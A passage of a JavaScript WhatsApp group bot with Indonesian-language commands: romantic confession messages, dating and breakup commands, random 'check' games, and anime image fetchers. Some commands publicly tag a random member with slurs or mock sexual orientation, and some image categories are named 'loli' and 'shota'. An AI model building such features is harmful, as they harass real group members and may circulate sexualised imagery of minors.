                  "Meskipun aku memiliki banyak hal untuk dikatakan, tetapi kata-kataku bersembunyi dariku dan aku tidak bisa mengungkapkannya. Hal sederhana yang ingin aku katakan adalah aku mencintaimu hari ini dan selalu.",
                  "Mungkin aku bukan Obama, tapi aku senang kalau bisa manggil kamu, o sayang. Kamu mau nggak mulai saat ini aku panggil seperti itu?",
                  "Mungkin aku tak sanggup menyeberangi lautan, menghantam karang atau menerjang badai. Tapi satu yang aku sanggup, membuatmu bahagia. Izinkan aku membuktikannya, ya!",
                  "Neng, bakar-bakaran yuk! | Bakar apa? | Kita bakar masa lalu dan buka lembaran baru dengan cinta kita.",
                  "Nggak perlu basa basi. Kita udah kenal lama, aku suka kamu apa adanya. Jadian yuk!",
                  "Pepatah mengatakan, empat sehat lima sempurna. Namun, aku tidak merasakan kesempurnaan itu sebelum aku merasakan kasih sayangmu.",
                  "Saatnya aku mengungkapkan perasaan yang terdalam kepadamu. Aku ingin kamu tahu bahwa aku mencintaimu seperti aku tidak pernah mencintai siapa pun sebelumnya.",
                  "Saking jatuh cintanya aku sama kamu. Mendengar kamu kentut aja aku sudah bahagia.",
                  "Satu tambah satu sama dengan dua. Aku tanpamu nggak bisa apa-apa. Satu dua tiga sepuluh. Aku maunya kamu jadi pacarkuh.",
                  "Secantik-canriknya kamu, itu nggak ada gunanya kalau nggak jadi punyaku.",
                  "Sejak kenal kamu, bawaannya pengin belajar terus. Belajar jadi yang terbaik. Untuk selanjutnya, kamu mau nggak ngebimbing aku, selalu ada di sampingku?",
                  "Senjata bertuah amatlah sakti. Kalah oleh iman nan hakiki. Maukah kau jadi orang yang aku kasihi? Aku janji cintaku sampai mati.",
                  "Seseorang bermimpi tentangmu setiap malam. Seseorang tidak bisa bernapas tanpamu, kesepian. Seseorang berharap suatu hari kau akan melihatnya. Seseorang itu adalah aku.",
                  "Setelah hari berlalu, aku yakin kamu pilihanku.",
                  "Setelah sekian lama bersama, aku ingin kita tidak hanya sekadar teman saja. Aku yakin kamu paham maksudku, dan aku berharap semoga kamu setuju. Aku mencintaimu.",
                  "Suatu ketika, ada seorang laki-laki yang mencintai perempuan yang tawanya bagaikan sebuah pertanyaan yang seumur hidup ingin dijawabnya. Akulah laki-laki itu, seorang laki-laki yang sedang menginginkan perempuan untuk jawaban di hidupnya. Perempuan itu adalah kamu.",
                  "Suka maupun duka, senang maupun susah, kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu karena aku mau kamu jadi pacar aku?",
                  "Tak ada alasan yang pasti dan jelas kenapa aku cinta kamu, tapi yang pasti aku menginginkan aku bahagia denganmu dan tak ingin sampai kamu terluka.",
                  "Tak bisa dibayangkan jika di dunia ini tak ada yang namanya cinta. Ya, rasa cinta bagi sebagian orang memberi keindahan yang membuat hari-hari semakin berwarna. Apalagi jika perasaan cinta yang kita punya dibalas oleh orang yang kita suka.",
                  "Tak hanya menyenangkan, aku yakin kamu dapat diandalkan di masa depan.",
                  "Tak ragu lagi untuk ungkapkan kepada seseorang yang ada di hati. Itu adalah kamu.",
                  "Telah banyak waktuku terlewati bersamamu, suka maupun duka senang maupun susah kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu. Karena aku mau kamu jadi pacar aku?",
                  "Tidak peduli seberapa sederhanya dan ketidakjelasan kamu. Tapi bagi aku, kamu adalah kesempurnaan yang memiliki kejelasan. Aku mau kamu jadi pacarku.",
                  "Untuk apa memajang foto berdua? Yang aku mau fotomu ada dalam buku nikahku kelak. Maukah kamu jadi pacarku?"
                ]
                let katakata = await pickRandom(ktnmbk)
                let teks = `*Love Message...*\n\n@${m.sender.split("@")[0]}\n❤️❤️\n@${user.split("@")[0]}\n\n"${katakata}"`
                sock.jadian[user] = [m.sender]
                sock.sendTextWithMentions(m.chat, teks, m),
                  sock.sendTextWithMentions(m.chat, `Kamu baru saja mengajak @${user.split("@")[0]} jadian\n\n@${user.split("@")[0]} silahkan beri keputusan🎉\n${prefix}terima\n${prefix}tolak`, m)
              }
            }
            break

            case 'terima': {
              if (!m.isGroup) return onlyGrup()
              if (sock.jadian[m.sender]) {
                let user = sock.jadian[m.sender][0]
                db.users[user].pacar = m.sender
                db.users[m.sender].pacar = user
                sock.sendTextWithMentions(m.chat, `Horeee🎉🎉\n\n@${m.sender.split("@")[0]} jadian dengan\n❤️ @${user.split("@")[0]}\n\nSemoga langgeng 🥳🙂`, m)
                delete sock.jadian[m.sender]
              } else {
                m.reply("ihh kaga ada yang nembak kamu 🙄")
              }
            }
            break

            case 'tolak': {
              if (!m.isGroup) return onlyGrup()
              if (sock.jadian[m.sender]) {
                let user = sock.jadian[m.sender][0]
                sock.sendTextWithMentions(m.chat, `@${user.split("@")[0]} ditolak njir 😓`, m)
                delete sock.jadian[m.sender]
              } else {
                m.reply("Dihh lu nolak siapa, setan ? 🙄")
              }
            }
            break

            case 'putus': {
              if (!m.isGroup) return onlyGrup()
              let pasangan = db.users[m.sender].pacar
              if (pasangan) {
                db.users[m.sender].pacar = ""
                db.users[pasangan].pacar = ""
                sock.sendTextWithMentions(m.chat, `Kamu putus sama @${pasangan.split("@")[0]} 😓🤔`, m)
              } else {
                m.reply("Kamu jomblo ngapain putus njir 🙄")
              }
            }
            break

            case 'cekpacar':
            case 'cekpasangan': {
              if (!m.isGroup) return onlyGrup()
              try {
                let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "")
                if (!user) return m.reply(`*Tag/Reply Seseorang!*\n\nContoh:\n${prefix + command} @0`)
                let pasangan = db.users[user].pacar
                if (pasangan) {
                  sock.sendTextWithMentions(m.chat, `@${user.split("@")[0]} udah ❤️ sama @${pasangan.split("@")[0]}`, m)
                } else {
                  sock.sendTextWithMentions(m.chat, `@${user.split("@")[0]} masih jomblo tuh🥳`, m)
                }
              } catch (error) {
                sock.sendTextWithMentions(m.chat, `@${user.split("@")[0]} tidak ada didalam database😞`, m)
              }
            }
            break

            case 'top': {
              if (!m.isGroup) return onlyGrup()
              let kategori = q;
              if (!kategori) return m.reply(`Penggunaan ${command} [Kategori]\n\nContoh: ${command} orang pintar`);

              let member = participants.map(u => u.jid).filter(v => v !== sock.user.jid)
              let top5 = [];
              for (let i = 0; i < 5; i++) {
                top5.push(member[Math.floor(Math.random() * member.length)]);
              }
              let mention = top5.map((user, index) => `${index + 1}. @${user.split('@')[0]}`).join('\n');
              sock.sendMessage(m.chat, {
                text: `  ☟ Top 5 ${kategori} ☟\n\n${mention}`,
                mentions: top5
              }, {
                quoted: m
              });
            }
            break
            case 'bego':
            case 'goblok':
            case 'janda':
            case 'perawan':
            case 'babi':
            case 'tolol':
            case 'pekok':
            case 'jancok':
            case 'pinter':
            case 'pintar':
            case 'asu':
            case 'bodoh':
            case 'gay':
            case 'lesby':
            case 'bajingan':
            case 'jancok':
            case 'anjing':
            case 'anjg':
            case 'anjj':
            case 'anj':
            case 'ngentod':
            case 'ngentot':
            case 'monyet':
            case 'mastah':
            case 'newbie':
            case 'bangsat':
            case 'bangke':
            case 'sange':
            case 'sangean':
            case 'dakjal':
            case 'horny':
            case 'wibu':
            case 'puki':
            case 'puqi':
            case 'peak':
            case 'pantex':
            case 'pantek':
            case 'setan':
            case 'iblis':
            case 'cacat':
            case 'yatim':
            case 'piatu': {
              if (!m.isGroup) return onlyGrup()
              let member = participants.map(u => u.jid).filter(v => v !== sock.user.jid)
              let org = member[Math.floor(Math.random() * member.length)];
              sock.sendMessage(m.chat, {
                text: `Anak ${command} di sini adalah @${org.split('@')[0]}`,
                mentions: [org]
              }, {
                quoted: m
              })
            }
            break


            case 'apakah': {
              if (!text) return m.reply(`Contoh: ${cmd} saya ganteng?`)
              const jawaban = ['Iya', 'Mungkin iya', 'Mungkin', 'Gak', 'Mungkin gak', 'Gak tau']
              const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
              m.reply(`*Pertanyaan:* Apakah ${text}\n*Jawaban:* ${coli}`)
            }
            break

            case 'bisakah': {
              if (!text) return m.reply(`Contoh: ${cmd} saya jadi kaya?`)
              const jawaban = ['Bisa banget', 'Bisa', 'Mungkin bisa', 'Mungkin', 'Gak bisa', 'Mungkin gak bisa', 'Gak bisa lah', 'Gak tau']
              const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
              m.reply(`*Pertanyaan:* Bisakah ${text}\n*Jawaban:* ${coli}`)
            }
            break

            case 'kapankah': {
              if (!text) return m.reply(`Contoh: ${cmd} saya kaya?`)
              const jawabanWaktu = [
                'Bentar lagi',
                'Nunggu kiamat dulu',
                'Kapan-kapan',
                'Besok',
                'Pas lu tidur',
                'Gw juga gak tau kapan'
              ]
              const waktuRandom = Math.floor(Math.random() * 10) + 1
              const unitWaktu = ['minggu', 'bulan', 'tahun']
              const unitWaktuRandom = unitWaktu[Math.floor(Math.random() * unitWaktu.length)]
              const jawaban = [...jawabanWaktu, `${waktuRandom} ${unitWaktuRandom} lagi`]
              const hasilJawaban = jawaban[Math.floor(Math.random() * jawaban.length)]
              m.reply(`*Pertanyaan:* Kapankah ${text}\n*Jawaban:* ${hasilJawaban}`)
            }
            break

            case 'cekganteng': {
              if (!pushname) return m.reply(`Contoh: ${cmd} nama seseorang atau tag`)
              const jawaban1 = ['ganteng', 'jelek']
              const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)]

              const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Ganteng', 'Ganteng amat', 'Lumayan', 'Jelek', 'Jelek amat']
              const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
              sock.sendTextWithMentions(m.chat, `*Pertanyaan:* Cekganteng ${pushname}\n*Jawaban:* ${coli}`, m)
            }
            break

            case 'cekcantik': {
              if (!pushname) return m.reply(`Contoh: ${cmd} nama seseorang atau tag`)
              const jawaban1 = ['cantik', 'jelek']
              const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)]

              const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Cantik', 'Cantik amat', 'Lumayan', 'Jelek', 'Jelek amat']
              const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
              sock.sendTextWithMentions(m.chat, `*Pertanyaan:* Cekcantik ${pushname}\n*Jawaban:* ${coli}`, m)
            }
            break

            case 'cekgay': {
              if (!pushname) return m.reply(`Contoh: ${cmd} nama seseorang atau tag`)
              const jawaban1 = ['gay', 'raja gay']
              const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)]

              const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Gay', 'Gay amat', 'Mayan', 'Gak', 'Gak lah']
              const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
              sock.sendTextWithMentions(m.chat, `*Pertanyaan:* Cekgay ${pushname}\n*Jawaban:* ${coli}`, m)
            }
            break

            case 'ceklesbi': {
              if (!pushname) return m.reply(`Contoh: ${cmd} nama seseorang atau tag`)
              const jawaban1 = ['lesbi', 'ratu lesbi']
              const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)]

              const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Lesbi', 'Lesbi amat', 'Mayan', 'Gak', 'Gak lah']
              const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
              sock.sendTextWithMentions(m.chat, `*Pertanyaan:* Ceklesbi ${pushname}\n*Jawaban:* ${coli}`, m)
            }
            break

            case 'sifat':
            case 'ceksifat': {
              if (!pushname) return m.reply(`Contoh: ${cmd} nama seseorang atau tag`)
              const sifat = [
                'Periang', 'Pemalu', 'Pendiam', 'Perhatian', 'Sabar', 'Cepat marah',
                'Ceroboh', 'Pekerja keras', 'Ambisius', 'Bijaksana', 'Manja', 'Kreatif',
                'Penyayang', 'Suka membantu', 'Pendendam', 'Penuh semangat', 'Romantis',
                'Cepat bosan', 'Penuh rencana', 'Suka menunda', 'Penuh rahasia',
                'Cuek', 'Penuh percaya diri', 'Pemikir', 'Suka bercanda', 'Jujur',
                'Penyendiri', 'Penuh kejutan', 'Pemalu tapi hangat', 'Bergairah',
                'Suka berdiskusi', 'Tegas', 'Suka menyendiri', 'Ramah', 'Misterius',
                'Perasa', 'Bijak', 'Tertutup', 'Suka tantangan', 'Optimis', 'Pencemas',
                'Suka menjadi pusat perhatian', 'Setia', 'Suka berpetualang', 'Gugup',
                'Sensitif', 'Suka ngatur', 'Tangguh', 'Serius', 'Mudah marah',
                'Pandai berdamai', 'Terlalu perfeksionis', 'Sederhana', 'Penuh kasih sayang',
                'Penuh energi', 'Introvert', 'Extrovert', 'Ambivert', 'Kocak', 'Logis',
                'Penyendiri tapi bisa bersosialisasi', 'Penuh ide', 'Sangat disiplin',
                'Berani mengambil risiko', 'Suka mengalah', 'Senang bergaul', 'Suka berolahraga',
                'Mudah terpengaruh', 'Bergantung pada orang lain', 'Penuh semangat hidup',
                'Terlalu banyak bicara', 'Sangat memperhatikan detail', 'Suka memberi nasihat'
              ]
              const coli = sifat[Math.floor(Math.random() * sifat.length)]
              m.reply(`*Pertanyaan:* Ceksifat ${pushname}\n*Jawaban:* ${coli}`)
            }
            break

            case 'cekhobi':
            case 'cekhoby':
            case 'cekhobby': {
              if (!pushname) return m.reply(`Contoh: ${cmd} nama seseorang atau tag`)
              const hobi = [
                'Membaca buku', 'Berenang', 'Olahraga', 'Memasak', 'Menulis', 'Bermain game',
                'Menonton film', 'Travelling', 'Mendaki gunung', 'Fotografi', 'Melukis',
                'Musik', 'Berkebun', 'Menggambar', 'Berburu', 'Mendengarkan podcast',
                'Berbelanja', 'Mengoleksi barang antik', 'Berkendara motor', 'Menyelam',
                'Bermain olahraga tim', 'Memancing', 'Menjahit', 'Mencipta seni', 'Seni bela diri',
                'Coding', 'Yoga', 'Meditasi', 'Menulis puisi', 'Sewaktu-waktu berkumpul dengan teman',
                'Berkreasi dengan DIY', 'Mendengarkan musik klasik', 'Menari', 'Bermain alat musik',
                'Mendengarkan cerita horor', 'Berselancar', 'Bermain skateboard', 'Camping',
                'Main kartu', 'Bermain catur', 'Bermain puzzle', 'Mempelajari bahasa baru',
                'Mengajar', 'Berkumpul di acara komunitas', 'Fotografi alam', 'Menulis cerita fiksi',
                'Berkendara sepeda', 'Main cosplay', 'Kegiatan sosial', 'Melakukan eksperimen kimia',
                'Astrologi', 'Bermain dengan hewan peliharaan', 'Memperbaiki barang rusak', 'Berkunjung ke museum',
                'Bermain tenis', 'Main golf', 'Bermain voli', 'Panjat tebing', 'Mendekorasi rumah',
                'Sewaktu-waktu berkemah', 'Bermain basket', 'Membuat kerajinan tangan', 'Bermain piano',
                'Bermain gitar', 'Mendengarkan musik rock', 'Main drum', 'Mengecat', 'Mengoleksi kartu',
                'Sains eksperimen', 'Menciptakan aplikasi', 'Menjahit pakaian', 'Bermain frisbee',
                'Bermain dengan teknologi', 'Berkendara mobil', 'Berkunjung ke pantai', 'Main catur',
                'Mengunjungi tempat bersejarah', 'Berkebun tanaman hias', 'Menciptakan game', 'Bermain tenis meja',
                'Bermain dengan mainan robotik', 'Bergabung dengan klub diskusi', 'Berkarya di YouTube', 'Menulis blog'
              ]
              const coli = hobi[Math.floor(Math.random() * hobi.length)]
              m.reply(`*Pertanyaan:* Cekhoby ${pushname}\n*Jawaban:* ${coli}`)
            }
            break

            case 'jodoh':
            case 'cekjodoh': {
              try {
                let target = text ?
                  text.replace(/[@]/g, '').split('@')[0] :
                  m.sender.split('@')[0]

                let member = participants
                  .filter(u => typeof u.jid === 'string' && u.jid.includes('@'))
                  .map(u => u.jid.split('@')[0])

                if (!member.includes(target)) target = m.sender.split('@')[0]

                let jodoh = member[Math.floor(Math.random() * member.length)]
                let jawab = `*JODOHNYA ${sock.getName(target + '@s.whatsapp.net').toUpperCase()}*\n@${target} ❤️ @${jodoh}`
                sock.sendTextWithMentions(m.chat, jawab, m)
              } catch (err) {
                m.reply('Terjadi kesalahan: ' + err)
              }
            }
            break

// ############# ANIME
    case 'akiyama':
    case 'ana':
    case 'art':
    case 'asuna':
    case 'ayuzawa':
    case 'boruto':
    case 'bts':
    case 'cartoon':
    case 'chiho':
    case 'chitoge':
    case 'cosplay':
    case 'cosplayloli':
    case 'cosplaysagiri':
    case 'cyber':
    case 'deidara':
    case 'doraemon':
    case 'elaina':
    case 'emilia':
    case 'erza':
    case 'exo':
    case 'gamewallpaper':
    case 'gremory':
    case 'hacker':
    case 'hestia':
    case 'hinata':
    case 'husbu':
    case 'inori':
    case 'islamic':
    case 'isuzu':
    case 'itachi':
    case 'itori':
    case 'jennie':
    case 'jiso':
    case 'justina':
    case 'kaga':
    case 'kagura':
    case 'kakasih':
    case 'kaori':
    case 'keneki':
    case 'kotori':
    case 'kurumi':
    case 'lisa':
    case 'madara':
    case 'megumin':
    case 'mikasa':
    case 'mikey':
    case 'miku':
    case 'minato':
    case 'mountain':
    case 'naruto':
    case 'neko2':
    case 'nekonime':
    case 'nezuko':
    case 'onepiece':
    case 'pentol':
    case 'pokemon':
    case 'programming':
    case 'randomnime':
    case 'randomnime2':
    case 'rize':
    case 'rose':
    case 'sagiri':
    case 'sakura':
    case 'sasuke':
    case 'satanic':
    case 'shina':
    case 'shinka':
    case 'shinomiya':
    case 'shizuka':
    case 'shota':
    case 'shortquote':
    case 'space':
    case 'technology':
    case 'tejina':
    case 'toukachan':
    case 'tsunade':
    case 'yotsuba':
    case 'yuki':
    case 'yulibocil':
    case 'yumeko': {

m.reply("Loading 🔁")
      let heyy
      if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/akiyama.json')
      if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ana.json')
      if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/art.json')
      if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/asuna.json')
      if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ayuzawa.json')
      if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/boneka.json')
      if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/boruto.json')
      if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/bts.json')
      if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cecan.json')
      if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/chiho.json')
      if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/chitoge.json')
      if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cogan.json')
      if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplay.json')
      if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplayloli.json')
      if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplaysagiri.json')
      if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cyber.json')
      if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/deidara.json')
      if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/doraemon.json')
      if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/eba.json')
      if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/elaina.json')
      if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/emilia.json')
      if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/erza.json')
      if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/exo.json')
      if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/femdom.json')
      if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/freefire.json')
      if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/gamewallpaper.json')
      if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/glasses.json')
      if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/gremory.json')
      if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/hekel.json')
      if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/hestia.json')
      if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/husbu.json')
      if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/inori.json')
      if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/islamic.json')
      if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/isuzu.json')
      if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/itachi.json')
      if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/itori.json')
      if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/jeni.json')
      if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/jiso.json')
      if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/justina.json')
      if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kaga.json')
      if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kagura.json')
      if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kakasih.json')
      if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kaori.json')
      if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kartun.json')
      if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/katakata.json')
      if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/keneki.json')
      if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kotori.json')
      if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kpop.json')
      if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kucing.json')
      if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kurumi.json')
      if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/lisa.json')
      if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/loli.json')
      if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/madara.json')
      if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/megumin.json')
      if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mikasa.json')
      if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mikey.json')
      if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/miku.json')
      if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/minato.json')
      if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mobil.json')
      if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/motor.json')
      if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mountain.json')
      if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/naruto.json')
      if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/neko.json')
      if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/neko2.json')
      if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/nekonime.json')
      if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/nezuko.json')
      if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/onepiece.json')
      if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pentol.json')
      if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pokemon.json')
      if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/profil.json')
      if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/programming.json')
      if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pubg.json')
      if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randblackpink.json')
      if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randomnime.json')
      if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randomnime2.json')
      if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/rize.json')
      if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/rose.json')
      if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ryujin.json')
      if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sagiri.json')
      if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sakura.json')
      if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sasuke.json')
      if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/satanic.json')
      if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shina.json')
      if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shinka.json')
      if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shinomiya.json')
      if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shizuka.json')
      if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shota.json')
      if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tatasurya.json')
      if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/technology.json')
      if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tejina.json')
      if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/toukachan.json')
      if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tsunade.json')
      if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/waifu.json')
      if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/wallhp.json')
      if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/wallml.json')
      if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/wallnime.json')
      if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yotsuba.json')
      if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yuki.json')
